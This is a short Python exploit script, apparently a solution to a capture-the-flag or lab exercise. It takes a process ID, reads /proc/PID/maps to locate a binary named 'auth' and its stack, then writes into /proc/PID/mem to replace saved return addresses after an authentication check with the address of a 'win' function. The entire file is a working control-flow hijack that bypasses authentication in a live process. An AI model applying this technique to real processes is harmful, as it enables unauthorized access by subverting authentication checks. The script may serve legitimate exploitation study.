#!/usr/bin/python3

import sys
import struct
import subprocess
import codecs

MAINRETOFF = 0x11ea # address immediately following authcheck ret
WINOFF = 0x1169
IMGNAME = "auth"

def main():
    if len(sys.argv) < 2:
        print("Usage: "+ sys.argv[0] +" pid")
        exit(-1)

    pid = sys.argv[1]

    pmap = ""
    with open("/proc/"+ sys.argv[1] +"/maps", "r") as fp:
        pmap = fp.read()

    # find image offset in maps
    # find stack in maps
    stacks = []
    image = []
    for l in pmap.split('\n'):
        if len(l.strip()) == 0:
            continue
        img = l.split()[-1].split('/')[-1]
        if img == '[stack]':
            stacks.append(l)
        if img == IMGNAME:
            image.append(l)

    img_ranges = list(map(lambda x: list(map(lambda y: int(y, 16), x.split()[0].split('-'))), image))

    stack_ranges = list(map(lambda x: list(map(lambda y: int(y, 16), x.split()[0].split('-'))), stacks))

    imgbase = min(img_ranges)[0]
    mainretaddr = MAINRETOFF + imgbase
    winaddr = WINOFF + imgbase

    print("mainretaddr: ", hex(mainretaddr))
    print("winaddr: ", hex(winaddr))

    with open("/proc/"+ pid +"/mem", "rb+") as fp: 
        for rng in stack_ranges:
            for i in range(rng[0], rng[1] - 7):
                fp.seek(i)
                val = fp.read(8)
                v = struct.unpack("<Q", val)
                if v[0] == mainretaddr: 
                    print("replacing return at", hex(i))
                    fp.seek(i)
                    fp.write(struct.pack("<Q", winaddr))

if __name__ == '__main__':
    main()
